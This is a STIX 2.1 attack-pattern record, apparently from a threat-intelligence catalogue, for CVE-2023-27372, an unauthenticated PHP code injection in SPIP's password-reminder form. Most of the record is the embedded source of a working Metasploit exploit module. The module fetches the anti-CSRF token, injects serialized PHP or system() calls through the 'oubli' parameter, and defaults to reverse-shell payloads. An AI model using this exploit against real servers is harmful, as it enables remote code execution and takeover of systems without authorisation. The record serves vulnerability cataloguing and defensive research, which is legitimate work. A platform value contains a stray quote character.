{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60c6dda4-ed43-4cf2-b8df-3bde6743f747",
    "created": "2024-08-14T17:12:13.83352Z",
    "modified": "2024-08-14T17:12:13.833524Z",
    "name": "SPIP form PHP Injection",
    "description": " This module exploits a PHP code injection in SPIP. The vulnerability exists in the oubli parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions are <3.2.18, <4.0.10, <4.1.18 and <4.2.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/spip_rce_form.rb",
            "external_id": "spip_rce_form.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html"
        },
        {
            "source_name": "reference",
            "url": "https://therealcoiffeur.com/c11010"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-27372"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SPIP form PHP Injection',\n        'Description' => %q{\n          This module exploits a PHP code injection in SPIP. The vulnerability exists in the\n          oubli parameter and allows an unauthenticated user to execute arbitrary commands\n          with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions\n          are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.\n        },\n        'Author' => [\n          'coiffeur',       # Initial discovery\n          'Laluka',         # PoC\n          'Julien Voisin'   # MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html' ],\n          [ 'URL', 'https://therealcoiffeur.com/c11010' ],\n          [ 'CVE', '2023-27372' ],\n        ],\n        'Privileged' => false,\n        'Platform' => %w[php linux unix],\n        'Arch' => [ARCH_PHP, ARCH_CMD],\n        'Targets' => [\n          [\n            'Automatic (PHP In-Memory)',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' },\n              'Type' => :php_memory,\n              'Payload' => {\n                'BadChars' => \"\\x22\\x00\"\n              }\n            }\n          ],\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Type' => :unix_memory,\n              'Payload' => {\n                'BadChars' => \"\\x22\\x00\\x27\"\n              }\n            }\n          ],\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-02-27'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to SPIP application', '/']),\n      ]\n    )\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path, 'spip.php')\n    res = send_request_cgi({ 'uri' => uri.to_s })\n\n    return Exploit::CheckCode::Unknown('Target is unreachable.') unless res\n    return Exploit::CheckCode::Unknown(\"Target responded with unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    version_string = res.get_html_document.at('head/meta[@name=\"generator\"]/@content')&.text\n    return Exploit::CheckCode::Unknown('Unable to find the version string on the page: spip.php') unless version_string =~ /SPIP (.*)/\n\n    version = ::Regexp.last_match(1)\n\n    if version.nil? && res.headers['Composed-By'] =~ /SPIP (.*) @/\n      version = ::Regexp.last_match(1)\n    end\n\n    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless version\n\n    print_status(\"SPIP Version detected: #{version}\")\n\n    rversion = Rex::Version.new(version)\n    if rversion >= Rex::Version.new('4.2.0')\n      if rversion < Rex::Version.new('4.2.1')\n        return Exploit::CheckCode::Appears\n      end\n    elsif rversion >= Rex::Version.new('4.1.0')\n      if rversion < Rex::Version.new('4.1.18')\n        return Exploit::CheckCode::Appears\n      end\n    elsif rversion >= Rex::Version.new('4.0.0')\n      if rversion < Rex::Version.new('4.0.10')\n        return Exploit::CheckCode::Appears\n      end\n    elsif rversion >= Rex::Version.new('3.2.0')\n      if rversion < Rex::Version.new('3.2.18')\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def execute_command(cmd, args = {})\n    send_request_cgi(\n      {\n        'uri' => args['uri'],\n        'method' => 'POST',\n        'vars_post' => {\n          'page' => 'spip_pass',\n          'lang' => 'fr',\n          'formulaire_action' => 'oubli',\n          'formulaire_action_args' => args['csrf'],\n          'oubli' => cmd\n        }\n      }\n    )\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path, 'spip.php?page=spip_pass&lang=fr')\n    res = send_request_cgi({ 'uri' => uri })\n\n    fail_with(Msf::Exploit::Failure::Unreachable, \"The request to uri: #{uri} did not respond\") unless res\n    fail_with(Msf::Exploit::Failure::UnexpectedReply, \"Got an http code that isn't 200: #{res.code}, when sending a request to uri: #{uri}\") unless res&.code == 200\n\n    csrf = ''\n    unless (node = res.get_html_document.xpath('//form//input[@name=\"formulaire_action_args\"]')).empty?\n      csrf = node.first['value']\n    end\n\n    print_status(\"Got anti-csrf token: #{csrf}\")\n\n    print_status(\"#{rhost}:#{rport} - Attempting to exploit...\")\n\n    oubli = ''\n    case target['Type']\n    when :php_memory\n      oubli = \"s:#{payload.encoded.length + 6 + 2}:\\\"<?php #{payload.encoded}?>\\\";\"\n    when :unix_memory\n      oubli = \"s:#{payload.encoded.length + 14 + 4}:\\\"<?php system('#{payload.encoded}')?>\\\";\"\n    end\n    execute_command(oubli, { 'uri' => uri, 'csrf' => csrf })\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-02-27",
    "x_mitre_platforms": [
        "unix'"
    ]
}